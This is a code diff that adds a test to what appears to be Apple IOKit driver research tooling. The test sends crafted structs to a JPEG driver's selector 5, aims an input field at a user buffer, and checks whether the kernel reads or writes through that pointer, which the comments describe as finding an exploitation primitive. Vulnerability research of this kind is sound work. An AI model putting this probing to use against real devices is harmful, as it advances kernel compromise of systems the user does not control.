@@ -1127,6 +1127,57 @@ NSString *ModJpegMethods(void) {
         }
     }
 
+    // ---- sel5 DEREF TEST: +0x78 is range-checked to <= 2^44 and our user
+    //      address passes, so it is a pointer candidate.  A pointer only
+    //      matters if the driver DEREFERENCES it.  Point +0x78 at a buffer
+    //      whose first 8 bytes we vary (0, 1, 0x10, 0x1000, 0x100000, all-ones)
+    //      while +0x58 (the 32-bit field) is set to a matching length.  If kr
+    //      changes with the POINTED-TO content, the driver reads through the
+    //      pointer - and we control what it reads, which is the primitive. ----
+    {
+        const uint32_t BASE = (uint32_t)sizeof(RSJpegIn);
+        uint8_t *pb = (uint8_t *)malloc(0x1000);
+        if (!pb) {
+            AveLog(@"[jpegmethods] deref test: pattern buffer allocation failed");
+        } else {
+            uint64_t paddr = (uint64_t)(uintptr_t)pb;
+            uint64_t contents[6] = {0, 1, 0x10, 0x1000, 0x100000, 0xffffffffffffffffull};
+            uint32_t lens[4] = {0, 0x58, 0x1000, 0x100000};
+            AveLog(S(@"[jpegmethods] deref test: +0x78 -> %#llx, vary the pointed-to content", paddr));
+            for (int li = 0; li < 4; li++) {
+                for (int ci = 0; ci < 6; ci++) {
+                    memset(pb, 0x42, 0x1000);
+                    memcpy(pb, &contents[ci], 8);
+                    uint8_t *big = (uint8_t *)malloc(0x1000);
+                    uint8_t *bigo = (uint8_t *)malloc(0x1000);
+                    if (!big || !bigo) { free(big); free(bigo); break; }
+                    memset(big, 0, 0x1000);
+                    memset(bigo, 0, 0x1000);
+                    rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
+                    memcpy(big + BASE, &lens[li], 4);            // +0x58 = 32-bit length
+                    memcpy(big + BASE + 0x20, &paddr, 8);         // +0x78 = our buffer
+                    size_t os = 0x1000;
+                    kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
+                    AveLog(S(@"[jpegmethods]   +0x58=%#x ptr->%#llx -> kr=%#x",
+                             lens[li], contents[ci], kr));
+                    if (kr == KERN_SUCCESS) {
+                        int changed = 0;
+                        for (uint32_t k = 0; k < 0x1000; k++)
+                            if (pb[k] != 0x42) { changed = 1; break; }
+                        if (changed) {
+                            AveLog(S(@"[jpegmethods]   *** DRIVER WROTE THROUGH +0x78 (len=%#x) ***",
+                                     lens[li]));
+                            rs_jm_dump(@"ptrbuf", pb, 0x1000);
+                        }
+                    }
+                    free(big);
+                    free(bigo);
+                }
+            }
+        }
+        free(pb);
+    }
+
     IOServiceClose(conn);
     CFRelease(src); CFRelease(dst); CFRelease(encSrc); CFRelease(encDst);
     IOObjectRelease(svc);
